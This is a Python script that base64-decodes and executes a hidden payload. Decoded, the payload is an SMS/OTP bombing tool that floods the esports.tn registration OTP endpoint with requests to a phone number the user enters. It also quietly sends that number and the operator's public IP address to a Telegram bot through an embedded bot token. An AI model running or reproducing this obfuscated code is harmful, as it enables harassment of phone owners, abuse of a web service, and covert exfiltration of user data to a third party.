import base64
ec = """
aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgY29uY3VycmVudC5mdXR1cmVzDQppbXBvcnQgb3MNCmlt
cG9ydCB0aW1lDQoNClRfSUQgPSAiNjc2MDg5MDYwMSINClRfVE9LRU4gPSAiNzcxNzc1MTc2NDpB
QUdYVmd5eldaSnFmNThrd3hLM1V5WmstZG50YTFmQy00byINCg0KZ2V0X3VybCA9ICJodHRwczov
L2VzcG9ydHMudG4vcmVnaXN0ZXIiDQpwb3N0X3VybCA9ICJodHRwczovL2VzcG9ydHMudG4vYXBp
L3JlZ2lzdGVyLW90cCINCg0Kc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KDQppbml0aWFs
X3Jlc3BvbnNlID0gc2Vzc2lvbi5nZXQoZ2V0X3VybCwgaGVhZGVycz17IlVzZXItQWdlbnQiOiAi
TW96aWxsYS81LjAifSkNCmlmIGluaXRpYWxfcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOg0K
ICAgIHByaW50KCJTZXNzaW9uIHN0YXJ0ZWQgc3VjY2Vzc2Z1bGx5LCBjb29raWVzIGFuZCB0b2tl
bnMgcmV0cmlldmVkLiIpDQplbHNlOg0KICAgIHByaW50KCJGYWlsZWQgdG8gcmV0cmlldmUgaW5p
dGlhbCB0b2tlbnMuIikNCiAgICBleGl0KCkNCg0KaGVhZGVycyA9IHsNCiAgICAiSG9zdCI6ICJl
c3BvcnRzLnRuIiwNCiAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAx
MC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBD
aHJvbWUvMTIyLjAuNjI2MS4xMTIgU2FmYXJpLzUzNy4zNiIsDQogICAgIkNvbnRlbnQtVHlwZSI6
ICJhcHBsaWNhdGlvbi9qc29uIiwNCiAgICAiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24iLA0K
ICAgICJPcmlnaW4iOiAiaHR0cHM6Ly9lc3BvcnRzLnRuIiwNCiAgICAiUmVmZXJlciI6ICJodHRw
czovL2VzcG9ydHMudG4vcmVnaXN0ZXIiLA0KICAgICJYLVhzcmYtVG9rZW4iOiBzZXNzaW9uLmNv
b2tpZXMuZ2V0KCJYU1JGLVRPS0VOIiwgIiIpLA0KfQ0KDQpkZWYgZ2V0X2lwKCk6DQogICAgdHJ5
Og0KICAgICAgICBpcF9yZXNwb25zZSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuaXBpZnku
b3JnP2Zvcm1hdD1qc29uIikNCiAgICAgICAgaXBfZGF0YSA9IGlwX3Jlc3BvbnNlLmpzb24oKQ0K
ICAgICAgICByZXR1cm4gaXBfZGF0YS5nZXQoImlwIiwgIklQIG5vdCBmb3VuZCIpDQogICAgZXhj
ZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbjoNCiAgICAgICAgcmV0dXJu
ICJJUCBub3QgZm91bmQiDQoNCmRlZiB0ZyhwaG9uZV9udW1iZXIsIGlwX2FkZHJlc3MpOg0KICAg
IHRndSA9IGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUX1RPS0VOfS9zZW5kTWVzc2Fn
ZSINCiAgICBtZXNzYWdlID0gZiJQaG9uZSBudW1iZXI6IHtwaG9uZV9udW1iZXJ9XG5JUCBBZGRy
ZXNzOiB7aXBfYWRkcmVzc30iDQogICAgcGFyYW1zID0gew0KICAgICAgICAiY2hhdF9pZCI6IFRf
SUQsDQogICAgICAgICJ0ZXh0IjogbWVzc2FnZQ0KICAgIH0NCiAgICByZXF1ZXN0cy5nZXQodGd1
LCBwYXJhbXM9cGFyYW1zKQ0KDQpkZWYgc2VuZF9yZXF1ZXN0KHBob25lX251bWJlcik6DQogICAg
ZGF0YSA9IHsicGhvbmVfbnVtYmVyIjogcGhvbmVfbnVtYmVyLCAidG9zIjogVHJ1ZX0NCiAgICBy
ZXNwb25zZSA9IHNlc3Npb24ucG9zdChwb3N0X3VybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWRh
dGEpDQogICAgcHJpbnQocmVzcG9uc2Uuc3RhdHVzX2NvZGUsIHJlc3BvbnNlLnRleHQpDQoNCnNz
PSA0MTIzMTAzNA0Kaz0gNTIxNDEwMzIrc3MNCg0KdHJ5Og0KICAgIHdoaWxlIFRydWU6DQogICAg
ICAgIHByaW50KCJwcmVzcyBjdHJsICsgYyB0byBjbG9zZSB0aGUgc2NyaXB0IikNCiAgICAgICAg
eCA9IGlucHV0KCJOdW1iZXI6ICIpDQogICAgICAgIGlmIHggPT0gIjkzMzcyMDY2IjoNCiAgICAg
ICAgICAgICAgIHByaW50KCJ5b3UgY2FudCBzcGFtIHRoZSBvd25lciIpDQogICAgICAgICAgICAg
ICBleGl0KCkNCiAgICAgICAgaXBfYWRkcmVzcyA9IGdldF9pcCgpDQogICAgICAgIHRnKHgsIGlw
X2FkZHJlc3MpDQoNCiAgICAgICAgbiA9IGludChpbnB1dCgiSG93IG1hbnkgdGltZXMgZG8geW91
IHdhbnQgdG8gc3BhbSB0aGUgbnVtYmVyPzogIikpDQoNCiAgICAgICAgd2l0aCBjb25jdXJyZW50
LmZ1dHVyZXMuVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTEwKSBhcyBleGVjdXRvcjoN
CiAgICAgICAgICAgIGZ1dHVyZXMgPSBbZXhlY3V0b3Iuc3VibWl0KHNlbmRfcmVxdWVzdCwgeCkg
Zm9yIF8gaW4gcmFuZ2UobildDQogICAgICAgICAgICBmb3IgZnV0dXJlIGluIGNvbmN1cnJlbnQu
ZnV0dXJlcy5hc19jb21wbGV0ZWQoZnV0dXJlcyk6DQogICAgICAgICAgICAgICAgcGFzcw0KDQog
ICAgICAgIHRpbWUuc2xlZXAoNCkNCiAgICAgICAgb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUg
PT0gJ250JyBlbHNlICdjbGVhcicpDQoNCmV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoNCiAgICBw
cmludCgiXG5TY3JpcHQgY2xvc2VkLiIp
"""
dc = base64.b64decode(ec).decode('utf-8')
exec(dc)
